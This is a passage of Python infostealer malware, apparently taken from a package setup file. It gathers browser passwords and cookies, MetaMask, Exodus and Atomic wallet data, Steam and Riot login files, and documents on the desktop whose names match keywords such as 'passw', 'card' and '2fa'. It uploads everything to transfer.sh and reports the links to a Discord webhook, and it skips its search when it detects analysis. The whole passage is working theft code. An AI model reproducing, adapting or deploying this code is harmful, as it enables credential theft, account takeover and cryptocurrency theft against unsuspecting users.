    'content':
    '',
    'embeds':[{
      'title':'0000 > ZIP Finder',
      'description':f"{wal}{ga}{ot}",
      'color':16711680,
      'footer':{
        'text':
        '0000',
        'icon_url':
        'https://cdn.discordapp.com/attachments/1049027297073709136/1049383489469939712/7176dceb89f7d390c539027d690d132d--dog-logo-logo-s-1.jpg'
}
}],
    'username':
    '0000',
    'avatar_url':
    'https://cdn.discordapp.com/attachments/1049027297073709136/1049383489469939712/7176dceb89f7d390c539027d690d132d--dog-logo-logo-s-1.jpg',
    'attachments':[]
}
  LoadUrlib(webhook,data=dumps(data).encode(),headers=headers)
def ZipThings(path,arg,procc):
  pathC=path
  name=arg
  global WalletsZip,GamingZip,OtherZip
  if 'nkbihfbeogaeaoehlefnkodbefgpgknn' in arg:
    browser=path.split('\\')[4].split('/')[1].replace(' ','')
    name=f"Metamask_{browser}"
    pathC=path+arg
  if not os.path.exists(pathC):return
  subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1",shell=True)
  if 'Wallet' in arg:
    browser=path.split('\\')[4].split('/')[1].replace(' ','')
    name=f"{browser}"
  elif 'Steam' in arg:
    if not os.path.isfile(f"{pathC}/loginusers.vdf"):return
    f=open(f"{pathC}/loginusers.vdf",'r+',encoding='utf8')
    data=f.readlines()
    found=False
    for l in data:
      if 'RememberPassword"		"1"' in l:
        found=True
    if found==False:return
    name=arg
  zf=ZipFile(f"{pathC}/{name}.zip",'w')
  for file in os.listdir(pathC):
    if not '.zip' in file:zf.write(pathC+'/'+file)
  zf.close()
  lnik=uploadToAnonfiles(f'{pathC}/{name}.zip')
  os.remove(f"{pathC}/{name}.zip")
  if 'Wallet' in arg or 'eogaeaoehlef' in arg:
    WalletsZip.append([name,lnik])
  elif 'Steam' in name or 'RiotCli' in name:
    GamingZip.append([name,lnik])
  else:
    OtherZip.append([name,lnik])
def GatherAll():
  '                   Default Path < 0 >                           Password < 1 >     Cookies < 2 >                          Extentions < 3 >                                  '
  browserPaths=[
[
      f"{roaming}/Opera Software/Opera GX Stable",'/','/Network',
      '/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'
],
[
      f"{roaming}/Opera Software/Opera Stable",'/','/Network',
      '/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'
],
[
      f"{roaming}/Opera Software/Opera Neon/User Data/Default",'/',
      '/Network','/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'
],
[
      f"{local}/Google/Chrome/User Data",'/Default','/Default/Network',
      '/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'
],
[
      f"{local}/Google/Chrome SxS/User Data",'/Default','/Default/Network',
      '/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'
],
[
      f"{local}/BraveSoftware/Brave-Browser/User Data",'/Default',
      '/Default/Network',
      '/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'
],
[
      f"{local}/Yandex/YandexBrowser/User Data",'/Default',
      '/Default/Network','/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn'
],
[
      f"{local}/Microsoft/Edge/User Data",'/Default','/Default/Network',
      '/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'
]
]
  PathsToZip=[[
    f"{roaming}/atomic/Local Storage/leveldb",'"Atomic Wallet.exe"','Wallet'
],[f"{roaming}/Exodus/exodus.wallet",'Exodus.exe','Wallet'],
['C:\\Program Files (x86)\\Steam\\config','steam.exe','Steam'],
[
                  f"{local}/Riot Games/Riot Client/Data",
                  'RiotClientServices.exe','RiotClient'
]]
  for patt in browserPaths:
    a=threading.Thread(target=getPassw,args=[patt[0],patt[1]])
    a.start()
    Threadlist.append(a)
  ThCokk=[]
  for patt in browserPaths:
    a=threading.Thread(target=getCookie,args=[patt[0],patt[2]])
    a.start()
    ThCokk.append(a)
  threading.Thread(target=GatherZips,args=[PathsToZip]).start()
  for thread in ThCokk:
    thread.join()
  DETECTED=Trust(Cookies)
  if DETECTED==True:return
  for thread in Threadlist:
    thread.join()
  global upths
  upths=[]
  for file in[f"szpasswords.txt",'szcook.txt']:
    upload(file.replace('.txt',''),
           uploadToAnonfiles(os.getenv('TEMP')+'\\'+file))
def uploadToAnonfiles(path):
  try:
    files={'file':(path,open(path,mode='rb'))}
    upload=requests.post('https://transfer.sh/',files=files)
    url=upload.text
    return url
  except:
    return False
def KiwiFolder(pathF,keywords):
  global KiwiFiles
  maxfilesperdir=7
  i=0
  listOfFile=os.listdir(pathF)
  ffound=[]
  for file in listOfFile:
    if not os.path.isfile(pathF+'/'+file):return
    i+=1
    if i<=maxfilesperdir:
      url=uploadToAnonfiles(pathF+'/'+file)
      ffound.append([pathF+'/'+file,url])
    else:
      break
  KiwiFiles.append(['folder',pathF+'/',ffound])
KiwiFiles=[]
def KiwiFile(path,keywords):
  global KiwiFiles
  fifound=[]
  listOfFile=os.listdir(path)
  for file in listOfFile:
    for worf in keywords:
      if worf in file.lower():
        if os.path.isfile(path+'/'+file)and '.txt' in file:
          fifound.append(
[path+'/'+file,
             uploadToAnonfiles(path+'/'+file)])
          break
        if os.path.isdir(path+'/'+file):
          target=path+'/'+file
          KiwiFolder(target,keywords)
          break
  KiwiFiles.append(['folder',path,fifound])
def filepathssearch():
  user=temp.split('\\AppData')[0]
  path2search=[
    user+'/Desktop',user+'/Downloads',user+'/Documents',
    user+'/Videos'
]
  key_wordsFiles=[
    'passw','pass','parola','cards','card','ccv','cc','parole','login',
    'key','fa','keys','secret','account','acount','paypal','bank',
    'metamask','wallet','crypto','exodus','discord','2fa','code','memo',
    'compte','token','backup','secret'
]
  wikith=[]
  for patt in path2search:
    kiwi=threading.Thread(target=KiwiFile,args=[patt,key_wordsFiles])
    kiwi.start()
    wikith.append(kiwi)
  return wikith
global keyword,cookiWords,paswWords,WalletsZip,GamingZip,OtherZip
keyword=[
  'mail','[paysafecard](https://www.paysafecard.com)',
  '[gmail](mail.google.com)','[stake](https://stake.com)',
  '[roobet](https://roobet.com)','[shopify](https://www.shopify.com)',
  '[coinbase](https://coinbase.com)','[sellix](https://sellix.io)',
  '[gmail](https://gmail.com)','[steam](https://steam.com)',
  '[discord](https://discord.com)','[riotgames](https://riotgames.com)',
  '[youtube](https://youtube.com)','[instagram](https://instagram.com)',
  '[tiktok](https://tiktok.com)','[twitter](https://twitter.com)',
  '[facebook](https://facebook.com)','card',
  '[epicgames](https://epicgames.com)','[spotify](https://spotify.com)',
  '[yahoo](https://yahoo.com)','[roblox](https://roblox.com)',
  '[twitch](https://twitch.com)','[minecraft](https://minecraft.net)','bank',
  '[paypal](https://paypal.com)','[origin](https://origin.com)',
  '[amazon](https://amazon.com)','[ebay](https://ebay.com)',
  '[aliexpress](https://aliexpress.com)',
  '[playstation](https://playstation.com)','[hbo](https://hbo.com)',
  '[xbox](https://xbox.com)','buy','sell','[binance](https://binance.com)',
  '[hotmail](https://hotmail.com)','[outlook](https://outlook.com)',
  '[crunchyroll](https://crunchyroll.com)','[telegram](https://telegram.com)',
  '[pornhub](https://pornhub.com)','[disney](https://disney.com)',
  '[expressvpn](https://expressvpn.com)','crypto','[uber](https://uber.com)',
  '[netflix](https://netflix.com)'
]
CookiCount=0
cookiWords=[]
paswWords=[]
WalletsZip=[]
GamingZip=[]
OtherZip=[]
GatherAll()
DETECTED=Trust(Cookies)
if not DETECTED:
  pathsearch=filepathssearch()
  for thread in pathsearch:
    thread.join()
  time.sleep(0.2)
  filetext='\n'
  for arg in KiwiFiles:
    if len(arg[2])!=0:
      foldpath=arg[1]
      foldlist=arg[2]
      for ffil in foldlist:
        a=ffil[0].split('/')
        fileanme=a[len(a)-1]
        b=ffil[1]
        filetext+=f"[{fileanme}]({b})\n"
  upload('filestealer',filetext)

# setup(...) removed                                                                                                                                                                                                                                                                    